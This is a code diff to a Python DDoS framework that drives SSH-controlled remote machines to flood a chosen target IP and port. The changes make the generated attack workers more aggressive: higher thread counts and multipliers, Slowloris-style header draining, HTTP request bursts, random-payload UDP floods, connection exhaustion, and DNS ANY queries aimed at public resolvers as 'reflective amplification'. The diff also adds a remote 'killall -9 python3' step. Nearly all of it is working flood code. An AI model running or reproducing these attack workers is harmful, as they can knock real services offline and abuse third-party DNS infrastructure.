@@ -194,11 +194,14 @@ class SingleLineDisplayThread(threading.Thread):
 
                 total_bw = 0.0
                 total_threads = 0
+                instance_count = len(self.ssh_instances)
+                
                 for inst in self.ssh_instances:
                     metrics = inst.get_current_metrics()
                     total_bw += metrics.get('bandwidth_mbps', 0.0)
                     total_threads += metrics.get('threads', 0)
 
+                avg_bandwidth = total_bw / instance_count if instance_count > 0 else 0.0
                 instances_working = len(self.ssh_instances)
 
                 print(
@@ -206,7 +209,6 @@ class SingleLineDisplayThread(threading.Thread):
                     f"Response: {resp_str:9s} | "
                     f"Timeouts: {timeouts}/{total_checks} | "
                     f"Instances: {instances_working} | "
-                    f"BandWidth: {total_bw:10.2f} Mbps | "
                     f"Threads: {total_threads}"
                 )
                 time.sleep(1)
@@ -235,7 +237,7 @@ class SSHInstance:
         self.current_threads = 0
         self.remote_cores = 0
         self.current_multiplier = 10.0
-        self.threads_per_process = 50
+        self.threads_per_process = 80  # more aggressive threading per process
         self.is_monitoring = False
         self.target_ip = None
         self.target_port = None
@@ -301,22 +303,38 @@ class SSHInstance:
             output, _, _ = self.execute_command(cmd_threads, timeout=3)
             threads = int(output.strip()) if output.strip() else 0
 
-            cmd_bandwidth = "cat /proc/net/dev | grep -E 'eth0|ens' | head -1 | awk '{print $10}'"
+            # bytes sent per second using /proc/net/dev deltas
+            cmd_bandwidth = "cat /proc/net/dev | awk 'NR>2 {sum+=$10} END {print sum}'"
             output, _, _ = self.execute_command(cmd_bandwidth, timeout=3)
-            bytes_sent = int(output.strip()) if output.strip() and output.strip().isdigit() else 0
-            bandwidth = bytes_sent / (1024 * 1024)
+            current_bytes = int(output.strip()) if output.strip().isdigit() else 0
+
+            now = time.time()
+            if not hasattr(self, "_last_bw_bytes"):
+                self._last_bw_bytes = current_bytes
+                self._last_bw_time = now
+                bandwidth_mbps = 0.0
+            else:
+                dt = now - self._last_bw_time
+                db = current_bytes - self._last_bw_bytes
+                if dt > 0 and db >= 0:
+                    bps = db / dt
+                    bandwidth_mbps = (bps * 8) / (1024 * 1024)
+                else:
+                    bandwidth_mbps = 0.0
+                self._last_bw_bytes = current_bytes
+                self._last_bw_time = now
 
             return {
                 "cpu": cpu,
                 "memory": memory,
-                "bandwidth_mbps": bandwidth,
+                "bandwidth_mbps": max(0.0, bandwidth_mbps),
                 "threads": threads
             }
         except:
             return {
                 "cpu": 0,
                 "memory": 0,
-                "bandwidth_mbps": 0,
+                "bandwidth_mbps": 0.0,
                 "threads": 0
             }
 
@@ -335,23 +353,19 @@ class SSHInstance:
         old_multiplier = self.current_multiplier
 
         if cpu < 40:
-            self.current_multiplier = min(self.current_multiplier * 2.5, 60.0)
-        elif cpu < 50:
-            self.current_multiplier = min(self.current_multiplier * 2.0, 60.0)
-        elif cpu < 60:
-            self.current_multiplier = min(self.current_multiplier * 1.50, 60.0)
+            self.current_multiplier = min(self.current_multiplier * 3.0, 80.0)
+        elif cpu < 55:
+            self.current_multiplier = min(self.current_multiplier * 2.0, 80.0)
         elif cpu < 70:
-            self.current_multiplier = min(self.current_multiplier * 1.30, 60.0)
-        elif 70 <= cpu < 75:
-            self.current_multiplier = min(self.current_multiplier * 1.15, 60.0)
-        elif 75 <= cpu < self.target_min_cpu:
-            self.current_multiplier = min(self.current_multiplier * 1.08, 60.0)
+            self.current_multiplier = min(self.current_multiplier * 1.4, 80.0)
+        elif cpu < self.target_min_cpu:
+            self.current_multiplier = min(self.current_multiplier * 1.1, 80.0)
         elif self.target_min_cpu <= cpu <= self.target_max_cpu:
             pass
         elif self.target_max_cpu < cpu <= 90:
-            self.current_multiplier = max(self.current_multiplier * 0.92, 1.0)
+            self.current_multiplier = max(self.current_multiplier * 0.9, 1.0)
         else:
-            self.current_multiplier = max(self.current_multiplier * 0.75, 1.0)
+            self.current_multiplier = max(self.current_multiplier * 0.7, 1.0)
 
         if abs(self.current_multiplier - old_multiplier) > 0.5:
             total_workers = int(self.remote_cores * self.current_multiplier * self.threads_per_process)
@@ -382,7 +396,7 @@ class SSHInstance:
         while self.is_monitoring and not GLOBAL_SHUTDOWN:
             try:
                 self.adjust_threads()
-                for _ in range(30):
+                for _ in range(20):
                     if GLOBAL_SHUTDOWN or not self.is_monitoring:
                         break
                     time.sleep(0.1)
@@ -446,7 +460,7 @@ ulimit -n 999999 2>/dev/null
     def _generate_enhanced_attack_script(self, target_ip: str, target_port: int, attack_name: str, duration: int) -> str:
         base = f'''#!/usr/bin/env python3
 
-import socket,struct,random,time,sys,threading
+import socket,struct,random,time,sys,threading,os
 from multiprocessing import Process,cpu_count
 
 target_ip=sys.argv[1] if len(sys.argv)>1 else '{target_ip}'
@@ -486,9 +500,6 @@ THREADS_PER_PROCESS={self.threads_per_process}
     end_time=time.time()+duration
     while time.time()<end_time:
         try:
-            src_ip=target_ip
-            src_port=random.randint(49152,65535)
-            seq=random.randint(0,2**32-1)
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.settimeout(1)
             s.connect((target_ip,target_port))
@@ -525,11 +536,32 @@ THREADS_PER_PROCESS={self.threads_per_process}
     end_time=time.time()+duration
     while time.time()<end_time:
         try:
-            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-            s.sendto(b'X'*64,(target_ip,target_port))
-            s.close()
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+            s.settimeout(2)
+            s.connect((target_ip,target_port))
+
+            preamble = (
+                f"GET /?r={random.randint(0,999999)} HTTP/1.1\\r\\n"
+                f"Host: {target_ip}\\r\\n"
+                "User-Agent: Mozilla/5.0 (Assessment)\\r\\n"
+            ).encode()
+            s.sendall(preamble)
+
+            for _ in range(20):
+                try:
+                    hdr = f"X-Drain-{random.randint(0,999999)}: {random.randint(0,999999)}\\r\\n".encode()
+                    s.sendall(hdr)
+                    time.sleep(0.2)
+                except:
+                    break
+
+            try:
+                s.close()
+            except:
+                pass
         except:
-            pass
+            time.sleep(0.01)
 ''',
 
             "FIN+ACK Flood": '''def attack_worker():
@@ -557,55 +589,66 @@ THREADS_PER_PROCESS={self.threads_per_process}
 ''',
 
             "TCP Fragmentation": '''def attack_worker():
-    try:
-        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
-        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
-    except:
-        return
     end_time=time.time()+duration
-    payload=b'X'*1024
+    payload=os.urandom(4096)
     while time.time()<end_time:
         try:
-            src_ip=f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-            ip_h=struct.pack('!BBHHHBBH4s4s',
-                69,0,40+len(payload),0,8192,64,6,0,
-                socket.inet_aton(src_ip),
-                socket.inet_aton(target_ip))
-            tcp_h=struct.pack('!HHIIBBHHH',
-                random.randint(49152,65535),target_port,
-                random.randint(0,2**32-1),
-                random.randint(0,2**32-1),
-                5<<4,2,65535,0,0)
-            sock.sendto(ip_h+tcp_h+payload,(target_ip,0))
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((target_ip,target_port))
+            for _ in range(512):
+                try:
+                    size=random.randint(32,256)
+                    s.sendall(payload[:size])
+                    time.sleep(0.0005)
+                except:
+                    break
+            try:
+                s.close()
+            except:
+                pass
         except:
-            pass
+            time.sleep(0.01)
 ''',
 
             "UDP Reflective Amplification": '''def attack_worker():
-    dns_servers=['8.8.8.8','1.1.1.1','208.67.222.222','9.9.9.9']
+    dns_servers=['8.8.8.8','1.1.1.1','9.9.9.9','208.67.222.222']
     end_time=time.time()+duration
-    query=b'\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\xff\\x00\\x01'
+    base_domains=[b'example.com',b'google.com',b'microsoft.com',b'cloudflare.com']
     while time.time()<end_time:
         try:
-            dns_server=random.choice(dns_servers)
             s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
             s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-            s.sendto(query,(dns_server,53))
+            s.settimeout(1.0)
+
+            dom=random.choice(base_domains)
+            qid=random.randint(0,65535).to_bytes(2,'big')
+            flags=b'\\x01\\x00'
+            qdcount=b'\\x00\\x01'
+            header=qid+flags+qdcount+b'\\x00\\x00\\x00\\x00\\x00\\x00'
+            labels=b''.join(len(p).to_bytes(1,'big')+p for p in dom.split(b'.'))+b'\\x00'
+            question=labels+b'\\x00\\xff\\x00\\x01'
+            pkt=header+question
+
+            server=random.choice(dns_servers)
+            s.sendto(pkt,(server,53))
             s.close()
         except:
-            pass
+            time.sleep(0.01)
 ''',
 
             "ICMP Ping of Death": '''def attack_worker():
     end_time=time.time()+duration
-    payload=b'X'*65000
     while time.time()<end_time:
         try:
+            size=random.randint(512,65500)
+            payload=os.urandom(size)
             s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
             s.sendto(payload,(target_ip,target_port))
             s.close()
         except:
-            pass
+            time.sleep(0.001)
 ''',
 
             "Connection Buffer Exhaustion": '''def attack_worker():
@@ -617,7 +660,7 @@ THREADS_PER_PROCESS={self.threads_per_process}
             s.settimeout(5)
             s.connect((target_ip,target_port))
             connections.append(s)
-            if len(connections)>1000:
+            if len(connections)>2000:
                 try:
                     connections[0].close()
                     connections.pop(0)
@@ -625,7 +668,7 @@ THREADS_PER_PROCESS={self.threads_per_process}
                     pass
         except:
             pass
-        time.sleep(0.01)
+        time.sleep(0.005)
     for c in connections:
         try:
             c.close()
@@ -634,28 +677,51 @@ THREADS_PER_PROCESS={self.threads_per_process}
 ''',
 
             "TCP Amplification": '''def attack_worker():
-    try:
-        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
-        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
-    except:
-        return
     end_time=time.time()+duration
+    paths=[
+        "/", "/login", "/search", "/api/v1/items",
+        "/api/v1/profile", "/static/js/app.js", "/static/css/main.css"
+    ]
     while time.time()<end_time:
         try:
-            for _ in range(30):
-                src_ip=f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-                ip_h=struct.pack('!BBHHHBBH4s4s',
-                    69,0,40,0,0,64,6,0,
-                    socket.inet_aton(src_ip),
-                    socket.inet_aton(target_ip))
-                tcp_h=struct.pack('!HHIIBBHHH',
-                    random.randint(49152,65535),target_port,
-                    random.randint(0,2**32-1),
-                    random.randint(0,2**32-1),
-                    5<<4,2,65535,0,0)
-                sock.sendto(ip_h+tcp_h,(target_ip,0))
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((target_ip,target_port))
+
+            burst=[]
+            for _ in range(120):
+                path=random.choice(paths)
+                qs=f"?t={random.randint(0,999999)}&r={random.random()}".replace("0.","")
+                full=f"{path}{qs}"
+                req=(
+                    f"GET {full} HTTP/1.1\\r\\n"
+                    f"Host: {target_ip}\\r\\n"
+                    "User-Agent: Mozilla/5.0 (Assessment)\\r\\n"
+                    "Accept: */*\\r\\n"
+                    "Connection: keep-alive\\r\\n"
+                    f"X-Req-ID: {random.randint(0,1_000_000)}\\r\\n"
+                    "\\r\\n"
+                )
+                burst.append(req)
+            data="".join(burst).encode()
+            s.sendall(data)
+
+            try:
+                s.settimeout(0.05)
+                for _ in range(20):
+                    try:
+                        if not s.recv(1024):
+                            break
+                    except:
+                        break
+            except:
+                pass
+            try:
+                s.close()
+            except:
+                pass
         except:
-            pass
+            time.sleep(0.005)
 ''',
 
             "Request Exaggeration": '''def attack_worker():
@@ -690,7 +756,7 @@ THREADS_PER_PROCESS={self.threads_per_process}
             for h in headers:
                 s.sendall(h)
             connections.append(s)
-            if len(connections)>100:
+            if len(connections)>150:
                 try:
                     connections[0].sendall(
                         b'X-Padding: '+str(random.randint(0,9999)).encode()+b'\\r\\n'
@@ -953,8 +1019,13 @@ class DDoSAssessmentFramework:
             print("-" * 150 + "\n")
 
             if attack_index < len(self.selected_attacks):
-                print("[*] Stabilization (5s)...\n")
-                time.sleep(5)
+                print("[*] Stabilization (10s) & killall python3 on all instances...\n")
+                for inst in instances:
+                    try:
+                        inst.execute_command("killall -9 python3 >/dev/null 2>&1 || true", timeout=5)
+                    except:
+                        pass
+                time.sleep(10)
 
         self._print_final_report()
 
